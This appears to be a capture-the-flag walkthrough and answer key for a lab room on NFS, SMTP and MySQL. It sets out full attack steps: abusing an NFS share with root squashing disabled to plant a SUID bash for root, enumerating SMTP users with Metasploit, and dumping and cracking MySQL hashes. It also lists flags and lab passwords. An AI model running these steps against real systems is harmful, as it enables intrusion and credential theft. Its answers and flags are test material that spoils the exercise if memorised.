Task 1: Get Connected 

[*] This room is a sequel to the first network services room.

    [!] No answer needed 

*****************************************************************************************************************************************

Task 2: Understanding NFS

[*] NFS stands for "Network File System" and allows a system to share directories and files with others over a network.

[*] By using NFS, users and programs can access files on remote systems almost as if they were local files.

    [+] Read and understand how does NFS work.

    [+] Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

[Question 1]: What does NFS stand for?

    [!] Answer: Network File System

[Question 2]: What process allows an NFS client to interact with a remote directory as though it was a physical device?

    [+] We have hint: What does your Operating System do to access a physical drive?

    [!] Answer: Mounting

[Question 3]: What does NFS use to represent files and directories on the server?

    [!] Answer: file handle

[Question 4]: What protocol does NFS use to communicate between the server and client?

    [!] Answer: RPC

[Question 5]: What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2

    [!] Answer: user id / group id

[Question 6]: Can a Windows NFS server share files with a Linux client? (Y/N)

    [!] Answer: Y

[Question 7]: Can a Linux NFS server share files with a MacOS client? (Y/N)

    [!] Answer: Y

[Question 8]: What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.

    [!] Answer: 4.2

*****************************************************************************************************************************************

Task 3: Enumerating NFS

[*] Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system."

    [+] Read and understand this task for options 

[Question 1]: Conduct a thorough port scan scan of your choosing, how many ports are open?

    [+] nmap -T4 -A -p- <Ip of VM> 

    [!] Answer: 7

[Question 2]: Which port contains the service we're looking to enumerate?

    [!] Answer: 2049

[Question 3]: Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?

    [+] showmount -e <Ip of VM> 

    [!] Answer: /home

[Question 4]: Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?

    [+] First, use “mkdir /tmp/mount” to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

    [!] Answer: Cappucino 

[Question 5]: Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

    [!] Answer: .ssh

[Question 6]: Which of these keys is most useful to us?

    [!] Answer: id_rsa

[Question 7]: Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)

    [+] Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".

    [!] Answer: Y 

*****************************************************************************************************************************************

Task 4: Exploiting NFS

[*] wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash.

    [+] Read and understand this task 

    [+] By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

[Question 1]: First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

    [!] Answer: No answer needed

[Question 2]: Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"    

    [!] Answer: No answer needed

[Question 3]: Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?

    [!] Answer: s

[Question 4]: Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.

    [!] Answer: -rwsr-sr-x

[Question 5]: Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

    [!] Answer: No answer needed

[Question 6]: Great! If all's gone well you should have a shell as root! What's the root flag?

    [+] now we log in again as cappucino ssh cappucino@<ip of vm> and run the bash.

    [+] ./bash -p 

    [+] Now we log in again as cappucino ssh cappucino@<ip of vm> and run the bash

    [!] Answer: THM{nfs_got_pwned}

*****************************************************************************************************************************************

Task 5: Understanding SMTP

[*] SMTP stands for "Simple Mail Transfer Protocol".

    [+] It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. 

    [+] The SMTP server performs three basic functions:

        [1] It verifies who is sending emails through the SMTP server.
        [2] It sends the outgoing mail
        [3] If the outgoing mail can't be delivered it sends the message back to the sender

    [+] Read and understand this task for all options.

[*] SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

[Question 1]: What does SMTP stand for?
 
    [!] Answer: Simple Mail Transfer Protocol 

[Question 2]: What does SMTP handle the sending of? (answer in plural)

    [!] Answer: emails

[Question 3]: What is the first step in the SMTP process?

    [!] Answer: SMTP handshake

[Question 4]: What is the default SMTP port?

    [!] Answer: 25

[Questionn 5]: Where does the SMTP server send the email if the recipient's server is not available?

    [!] Answer: smtp queue

[Question 6]: On what server does the Email ultimately end up on?

    [!] Answer: POP/IMAP 

[Question 7]: Can a Linux machine run an SMTP server? (Y/N)

    [!] Answer: Y

[Question 8]: Can a Windows machine run an SMTP server? (Y/N)

    [!] Answer: Y 

*****************************************************************************************************************************************

Task 6: Enumerating SMTP

[*] Start the VM attached to this task. If you still have the VM open from previous task then please terminate this.

[Question 1]: First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?

    [+] nmap -T4 -p- <ip of vm>

    [!] Answer: 25

[Question 2]: Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

    [!] Answer: msfconsole 

[Question 3]: Let's search for the module "smtp_version", what's it's full module name?

    [+] Search smtp_version 

    [!] Answer: auxiliary/scanner/smtp/smtp_version

[Question 4]: Great, now- select the module and list the options. How do we do this?

    [!] Answer: options 

[Question 5]: Have a look through the options, does everything seem correct? What is the option we need to set?

    [!] Answer: RHOST 

[Question 6]: Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

    [!] Answer: polosmtp.home

[Question 7]: What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

    [+] We have hint: If I want to send a letter to my friend I have to **** it.

    [!] Answer: Postfix

[Question 8]: Let's search for the module "smtp_enum", what's it's full module name?

    [!] Answer: auxiliary/scanner/smtp/smtp_enum

[*] We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).

[Question 9]: What option do we need to set to the wordlist's path?     

    [!] Answer: USER_FILE

[Question 10]: Once we've set this option, what is the other essential paramater we need to set?

    [!] Answer: RHOSTS 

[Question 11]: Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

    [!] Answer: No answer needed 

[Question 12]: Okay! Now that's finished, what username is returned?

    [!] Answer: administrator

*****************************************************************************************************************************************

Task 7: Exploiting SMTP 

    [+] Read this task and complete all questions

    [+] The password will show up. Now we can use that password to initiated an ssh connection to the server to get what is in smtp.txt

[Question 1]: What is the password of the user we found during our enumeration stage?

    [!] Answer: alejandro

[Question 2]: Great! Now, let's SSH into the server as the user, what is contents of smtp.txt

    [!] Answer: THM{who_knew_email_servers_were_c00l?}

*****************************************************************************************************************************************

Task 8: Understanding MySQL

[*] In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). 

[*] MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

    [+] The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol.

    [+] This whole process can be broken down into these stages:

        [1] MySQL creates a database for storing and manipulating data, defining the relationship of each table.

        [2] Clients make requests by making specific statements in SQL.

        [3] The server will respond to the client with whatever information has been requested.

[Question 1]: What type of software is MySQL?

    [!] Answer: relational database management system

[Question 2]: What language is MySQL based on?

    [!] Answer: SQL

[Question 3]: What communication model does MySQL use?

    [!] Answer: client-server

[Question 4]: What is a common application of MySQL?

    [!] Answer: back end database

[Question 5]: What major social network uses MySQL as their back-end database? This will require further research.

    [+] We have hint: Who was involved in the Cambridge Analytica scandal?

    [!] Answer: Facebook

*****************************************************************************************************************************************

Task 9: Enumerating MySQL

[*] Deploy the VM

    [+] nmap -sC -sV <IP of VM>

[Question 1]:As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?

    [!] Answer: 3306

[Question 2]: We can do this using the command "mysql -h [IP] -u [username] -p"

    [!] Answer: No answer needed

[Question 3]: Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.

    [!] Answer: No answer needed 

[Question 4]: We're going to be using the "mysql_sql" module.
Search for, select and list the options it needs. What three options do we need to set? (in descending order).

    [+] We have hint: Each option name is separated by a /

    [+] search mysql_sql

    [!] Answer: PASSWORD/RHOSTS/USERNAME

[Question 5]: Run the exploit. By default it will test with the "select version()" command, what result does this give you?

    [+] SET PASSWORD <password found in text>
    [+] SET RHOSTS <ip of vm>
    [+] SET USERNAME <username found in text>
    [+] RUN     

    [!] Answer: 5.7.29-0ubuntu0.18.04.1

[Question 6]:  Change the "sql" option to "show databases". how many databases are returned?

    [+] SET SQL Show databases

    [!] Answer: 4

*****************************************************************************************************************************************

Task 10: Exploiting MySQL

[*] Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:

    [1] MySQL server credentials

    [2] The version of MySQL running

    [3] The number of Databases, and their names.

[Question 1]: First, let's search for and select the "mysql_schemadump" module. What's the module's full name?

    [+] search mysql_schemadump

    [!] Answer: auxiliary/scanner/mysql/mysql_schemadump

[Question 2]: What's the name of the last table that gets dumped?

    [+] SET PASSWORD <password found in text>
    [+] SET RHOSTS <ip of vm>
    [+] SET USERNAME <username found in text>
    [+] RUN

    [!] Answer: x$waits_global_by_latency

[Question 3]: What's the module's full name?

    [+] mysql_hashdump

    [!] Answer: auxiliary/scanner/mysql/mysql_hashdump

[Question 4]: Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

    [+] SET PASSWORD <password found in text>
    [+] SET RHOSTS <ip of vm>
    [+] SET USERNAME <username found in text>
    [+] RUN

    [!] Answer: carl 

[Question 5]: What is the user/hash combination string?

    [+] We have hint: Remember to input the whole hash string, like: carl:*(HASHDATA)

    [+] echo carl:*HASH >> hash.txt

    [+] Exit out of the mfsconsole or use another terminal then type john hash.txt

    [!] Answer: carl:*EA031893AA21444B170FC2162A56978B8CEECE18

[Question 6]: Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?

    [!] Answer: doggie

[Question 7]: Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?
What's the contents of MySQL.txt

    [+] cat MySQL.txt

    [!] Answer: THM{congratulations_you_got_the_mySQL_flag}

*****************************************************************************************************************************************

Task 11: Further Learning 

    [!] Answer: No answer needed 








